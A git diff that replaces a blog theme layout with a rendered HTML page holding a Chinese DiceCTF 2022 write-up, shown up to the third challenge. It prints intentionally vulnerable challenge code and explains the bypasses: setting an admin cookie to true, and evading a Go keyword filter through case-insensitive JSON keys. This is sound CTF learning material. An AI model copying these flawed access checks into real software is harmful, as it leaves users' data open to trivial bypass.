@@ -1,43 +1,776 @@
-const { Component } = require('inferno');
-const classname = require('hexo-component-inferno/lib/util/classname');
-const Head = require('./common/head');
-const Navbar = require('./common/navbar');
-const Widgets = require('./common/widgets');
-const Footer = require('./common/footer');
-const Scripts = require('./common/scripts');
-const Search = require('./common/search');
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>DiceCTF-2022-WP | hututu&#39;blog</title>
+  <meta name="keywords" content=" ctf ">
+  <meta name="description" content="DiceCTF-2022-WP | hututu&#39;blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="Jackson反序列化漏洞一、简介Jackson是最流行的JSON解析器之一，具有很多的优先，如：依赖的jar包较少、解析速度快、运行时占用内存低、性能较好、简单易用等。 Jackson具有三大核心组件：  jackson-core，核心包，提供基于”流模式”解析的相关 API，包括 JsonPaser 和 JsonGenerator。 jackson-annotations，注解包，提供标准注解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jackson反序列化">
+<meta property="og:url" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="hututu&#39;blog">
+<meta property="og:description" content="Jackson反序列化漏洞一、简介Jackson是最流行的JSON解析器之一，具有很多的优先，如：依赖的jar包较少、解析速度快、运行时占用内存低、性能较好、简单易用等。 Jackson具有三大核心组件：  jackson-core，核心包，提供基于”流模式”解析的相关 API，包括 JsonPaser 和 JsonGenerator。 jackson-annotations，注解包，提供标准注解">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240429102214854.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240429095857826.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240429100220918.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240429100421046.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240429101433714.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240429101840501.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240429101906965.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240429102122699.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240429102808955.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240429104237178.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240430113225902.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240430113516710.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240430113544179.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240430114143848.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240430114224142.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240430114407250.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240430114333901.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240430114433486.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240430114451611.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240430114530735.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240430114610954.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240430170531307.png">
+<meta property="og:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240430170440742.png">
+<meta property="article:published_time" content="2024-05-07T03:11:37.000Z">
+<meta property="article:modified_time" content="2024-05-07T03:34:04.980Z">
+<meta property="article:author" content="hututu">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://localhost:4000/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240429102214854.png">
 
-module.exports = class extends Component {
-    render() {
-        const { site, config, page, helper, body } = this.props;
 
-        const language = page.lang || page.language || config.language;
-        const columnCount = Widgets.getColumnCount(config.widgets, config, page);
+<link rel="icon" href="/img/avatar.jpg">
 
-        return <html lang={language ? language.substr(0, 2) : ''}>
-            <Head site={site} config={config} helper={helper} page={page} />
-            <body class={`is-${columnCount}-column`}>
-                <Navbar config={config} helper={helper} page={page} />
-                <section class="section">
-                    <div class="container">
-                        <div class="columns">
-                            <div class={classname({
-                                column: true,
-                                'order-2': true,
-                                'column-main': true,
-                                'is-12': columnCount === 1,
-                                'is-8-tablet is-8-desktop is-8-widescreen': columnCount === 2,
-                                'is-8-tablet is-8-desktop is-6-widescreen': columnCount === 3
-                            })} dangerouslySetInnerHTML={{ __html: body }}></div>
-                            <Widgets site={site} config={config} helper={helper} page={page} position={'left'} />
-                            <Widgets site={site} config={config} helper={helper} page={page} position={'right'} />
-                        </div>
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>hututu</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://github.com/hututu2"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="email"
+               href="mailto:hututu1024@126.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(19)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="CTF-复现">
+                        
+                        CTF-复现
+                        <small>(4)</small>
+                        
                     </div>
-                </section>
-                <Footer config={config} helper={helper} />
-                <Scripts site={site} config={config} helper={helper} page={page} />
-                <Search config={config} helper={helper} />
-            </body>
-        </html>;
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="CTF-WP">
+                        
+                        CTF-WP
+                        <small>(11)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="web笔记">
+                        
+                        web笔记
+                        <small>(4)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/">About</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="19">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://abu-blank.top/">ABU</a></li>
+            
+            <li><a target="_blank" href="https://risehere.net/">Rise</a></li>
+            
+            <li><a target="_blank" href="https://www.hsinyan.cn/">Hsinyan</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ctf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>java</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="All web笔记 "
+           href="/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="java"
+           data-author="" >
+            <span class="post-title" title="Jackson反序列化">Jackson反序列化</span>
+            <span class="post-date" title="2024-05-07 11:11:37">2024/05/07</span>
+        </a>
+        
+        <a  class="All web笔记 "
+           href="/2024/04/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="java"
+           data-author="" >
+            <span class="post-title" title="Hessian反序列化">Hessian反序列化</span>
+            <span class="post-date" title="2024-04-09 16:45:56">2024/04/09</span>
+        </a>
+        
+        <a  class="All web笔记 "
+           href="/2024/04/01/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="java"
+           data-author="" >
+            <span class="post-title" title="ROME反序列化">ROME反序列化</span>
+            <span class="post-date" title="2024-04-01 22:14:35">2024/04/01</span>
+        </a>
+        
+        <a  class="All CTF-WP "
+           href="/2022/10/31/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%88%9D%E8%B5%9B-2022-WP/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="祥云杯初赛-2022-WP">祥云杯初赛-2022-WP</span>
+            <span class="post-date" title="2022-10-31 19:13:31">2022/10/31</span>
+        </a>
+        
+        <a  class="All CTF-WP "
+           href="/2022/10/31/b%E7%AB%991024-2022-WP/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="b站1024-2022-WP">b站1024-2022-WP</span>
+            <span class="post-date" title="2022-10-31 19:10:53">2022/10/31</span>
+        </a>
+        
+        <a  class="All CTF-WP "
+           href="/2022/09/20/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2022-WP/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="第五空间-2022-WP">第五空间-2022-WP</span>
+            <span class="post-date" title="2022-09-20 00:21:17">2022/09/20</span>
+        </a>
+        
+        <a  class="All CTF-WP "
+           href="/2022/07/25/DiceCTF-2022-WP/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="DiceCTF-2022-WP">DiceCTF-2022-WP</span>
+            <span class="post-date" title="2022-07-25 02:24:21">2022/07/25</span>
+        </a>
+        
+        <a  class="All CTF-WP "
+           href="/2022/07/23/%E8%99%8E%E7%AC%A6%E5%86%B3%E8%B5%9B-2022-WP/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="虎符决赛-2022-WP">虎符决赛-2022-WP</span>
+            <span class="post-date" title="2022-07-23 12:38:19">2022/07/23</span>
+        </a>
+        
+        <a  class="All CTF-WP "
+           href="/2022/07/20/NepCTF-2022-WP/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="NepCTF-2022-WP">NepCTF-2022-WP</span>
+            <span class="post-date" title="2022-07-20 00:50:45">2022/07/20</span>
+        </a>
+        
+        <a  class="All CTF-复现 "
+           href="/2022/07/17/DSCTF-2022-%E5%A4%8D%E7%9B%98/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="DSCTF-2022-复盘">DSCTF-2022-复盘</span>
+            <span class="post-date" title="2022-07-17 01:10:00">2022/07/17</span>
+        </a>
+        
+        <a  class="All CTF-WP "
+           href="/2022/07/06/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B-2022-WP/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="鹏城杯初赛-2022-WP">鹏城杯初赛-2022-WP</span>
+            <span class="post-date" title="2022-07-06 00:34:22">2022/07/06</span>
+        </a>
+        
+        <a  class="All CTF-WP "
+           href="/2022/06/01/CISCNCTF2022-%E5%88%9D%E8%B5%9B-WP/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="CISCNCTF2022 初赛 WP">CISCNCTF2022 初赛 WP</span>
+            <span class="post-date" title="2022-06-01 01:56:21">2022/06/01</span>
+        </a>
+        
+        <a  class="All CTF-WP "
+           href="/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="Dest0g3 520迎新赛 WP">Dest0g3 520迎新赛 WP</span>
+            <span class="post-date" title="2022-06-01 01:42:31">2022/06/01</span>
+        </a>
+        
+        <a  class="All web笔记 "
+           href="/2022/05/07/OAuth-2-0-%E4%B8%80%E7%A7%8D%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/"
+           data-tag="协议"
+           data-author="" >
+            <span class="post-title" title="OAuth 2.0 一种第三方授权访问机制">OAuth 2.0 一种第三方授权访问机制</span>
+            <span class="post-date" title="2022-05-07 01:51:47">2022/05/07</span>
+        </a>
+        
+        <a  class="All CTF-复现 "
+           href="/2022/04/30/MRCTF-2022-%E5%A4%8D%E7%8E%B0%EF%BC%88%E4%B8%80%EF%BC%89%E4%B8%80%E9%81%93%E9%9D%9E%E5%B8%B8%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84misc-pdd/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="MRCTF 2022 复现（一）一道非常有意思的misc (pdd)">MRCTF 2022 复现（一）一道非常有意思的misc (pdd)</span>
+            <span class="post-date" title="2022-04-30 23:17:53">2022/04/30</span>
+        </a>
+        
+        <a  class="All CTF-复现 "
+           href="/2022/04/05/picoCTF-2022-%E5%A4%8D%E7%9B%98/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="picoCTF-2022-复盘">picoCTF-2022-复盘</span>
+            <span class="post-date" title="2022-04-05 20:58:29">2022/04/05</span>
+        </a>
+        
+        <a  class="All CTF-WP "
+           href="/2022/03/20/%E8%99%8E%E7%AC%A6CTF2022-WP-Quest-RCE/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="虎符CTF2022 WP Quest-RCE">虎符CTF2022 WP Quest-RCE</span>
+            <span class="post-date" title="2022-03-20 21:17:09">2022/03/20</span>
+        </a>
+        
+        <a  class="All CTF-复现 "
+           href="/2022/03/08/AntCTF-D%CB%863CTF-2022-%E5%A4%8D%E7%9B%98/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="AntCTF &amp; Dˆ3CTF-2022-复盘">AntCTF &amp; Dˆ3CTF-2022-复盘</span>
+            <span class="post-date" title="2022-03-08 01:03:39">2022/03/08</span>
+        </a>
+        
+        <a  class="All CTF-WP "
+           href="/2021/09/24/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E8%B5%9B-WEB-WebFTP/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="2021第五空间线上赛-WEB-WebFTP">2021第五空间线上赛-WEB-WebFTP</span>
+            <span class="post-date" title="2021-09-24 00:03:46">2021/09/24</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-DiceCTF-2022-WP" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">DiceCTF-2022-WP</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="CTF-WP">CTF-WP</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">ctf</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2024-03-20 20:07:28'>2022-07-25 02:24</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#secure-page"><span class="toc-text">secure-page</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag-viewer"><span class="toc-text">flag-viewer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#point"><span class="toc-text">point</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverser"><span class="toc-text">reverser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oeps"><span class="toc-text">oeps</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#inspect-me"><span class="toc-text">inspect-me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pastebin"><span class="toc-text">pastebin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mk"><span class="toc-text">mk</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
     }
-};
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <img src="/2022/07/25/DiceCTF-2022-WP/image13.jpg" class="" title="This is an image">
+
+<p>一共十道题，只做出来8道，剩下两道完全找不到漏洞点，等大佬wp @_@ 。这比赛的题目顺序有点迷，并没有按照难度排列，做的时候有点过山车的感觉，不过总体体验还是不错的。</p>
+<h2 id="secure-page"><a href="#secure-page" class="headerlink" title="secure-page"></a>secure-page</h2><p>直接看源码，只需要把cookie中的admin设为true即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">@server.get(&#x27;/&#x27;)</span><br><span class="line">async def root(request):</span><br><span class="line">    admin = request.cookies.get(&#x27;admin&#x27;, &#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    if admin == &#x27;&#x27;:</span><br><span class="line">        headers[&#x27;set-cookie&#x27;] = &#x27;admin=false&#x27;</span><br><span class="line"></span><br><span class="line">    if admin == &#x27;true&#x27;:</span><br><span class="line">        return (200, &#x27;&#x27;&#x27;</span><br><span class="line">            &lt;title&gt;Secure Page&lt;/title&gt;</span><br><span class="line">            &lt;link rel=&quot;stylesheet&quot; href=&quot;/style.css&quot; /&gt;</span><br><span class="line">            &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">                &lt;h1&gt;Secure Page&lt;/h1&gt;</span><br><span class="line">                %s</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &#x27;&#x27;&#x27; % os.environ.get(&#x27;FLAG&#x27;, &#x27;flag is missing!&#x27;), headers)</span><br><span class="line">    else:</span><br><span class="line">        return (200, &#x27;&#x27;&#x27;</span><br><span class="line">            &lt;title&gt;Secure Page&lt;/title&gt;</span><br><span class="line">            &lt;link rel=&quot;stylesheet&quot; href=&quot;/style.css&quot; /&gt;</span><br><span class="line">            &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">                &lt;h1&gt;Secure Page&lt;/h1&gt;</span><br><span class="line">                Sorry, you must be the admin to view this content!</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &#x27;&#x27;&#x27;, headers)</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/25/DiceCTF-2022-WP/image1.png" class="" title="This is an image">
+
+<p><code>               hope&#123;signatures_signatures_signatures&#125;</code></p>
+<h2 id="flag-viewer"><a href="#flag-viewer" class="headerlink" title="flag-viewer"></a>flag-viewer</h2><p>从源码可以看到只需要访问/flag目录并把参数user设为admin即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@server.post(&#x27;/flag&#x27;)</span><br><span class="line">async def flag(request):</span><br><span class="line">    data = await request.post()</span><br><span class="line">    user = data.get(&#x27;   &#x27;, &#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">    if user != &#x27;admin&#x27;:</span><br><span class="line">        return (302, &#x27;/?message=Only the &quot;admin&quot; user can see the flag!&#x27;)</span><br><span class="line"></span><br><span class="line">    return (302, f&#x27;/?message=&#123;os.environ.get(&quot;FLAG&quot;, &quot;flag missing!&quot;)&#125;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/25/DiceCTF-2022-WP/image2.png" class="" title="This is an image">
+
+<p><code>hope&#123;oops_client_side_validation_again&#125;</code></p>
+<h2 id="point"><a href="#point" class="headerlink" title="point"></a>point</h2><p>源码给出来，用post发送json数据，只要恢复得到的结构体成员值为that_point即可，但是不能够含有what_point字段，因为json.Unmarshal不区分json字段的大小写，因此可以把键名what_point写成What_point来绕过检查。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> importantStuff <span class="keyword">struct</span> &#123;</span><br><span class="line">	Whatpoint <span class="type">string</span> <span class="string">`json:&quot;what_point&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag, err := os.ReadFile(<span class="string">&quot;flag.txt&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">		<span class="keyword">switch</span> r.Method &#123;</span><br><span class="line">		<span class="keyword">case</span> http.MethodGet:</span><br><span class="line">			fmt.Fprint(w, <span class="string">&quot;Hello, world&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		<span class="keyword">case</span> http.MethodPost:</span><br><span class="line">			body, err := io.ReadAll(r.Body)</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%s&quot;</span>, body)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				fmt.Fprintf(w, <span class="string">&quot;1 Something went wrong&quot;</span>)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> strings.Contains(<span class="type">string</span>(body), <span class="string">&quot;what_point&quot;</span>) || strings.Contains(<span class="type">string</span>(body), <span class="string">&quot;\\&quot;</span>) &#123;</span><br><span class="line">				fmt.Fprintf(w, <span class="string">&quot;2 Something went wrong&quot;</span>)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">var</span> whatpoint importantStuff</span><br><span class="line">			err = json.Unmarshal(body, &amp;whatpoint)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				fmt.Fprintf(w, <span class="string">&quot;3 Something went wrong&quot;</span>)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> whatpoint.Whatpoint == <span class="string">&quot;that_point&quot;</span> &#123;</span><br><span class="line">				fmt.Fprintf(w, <span class="string">&quot;Congrats! Here is the flag: %s&quot;</span>, flag)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				fmt.Fprintf(w, <span class="string">&quot;4 Something went wrong&quot;</span>)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			fmt.Fprint(w, <span class="string">&quot;Method not allowed&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	log.Fatal(http.ListenAndServe(<span class="string">&quot;:1234&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/25/DiceCTF-2022-WP/image3.png" class="" title="This is an image">
+
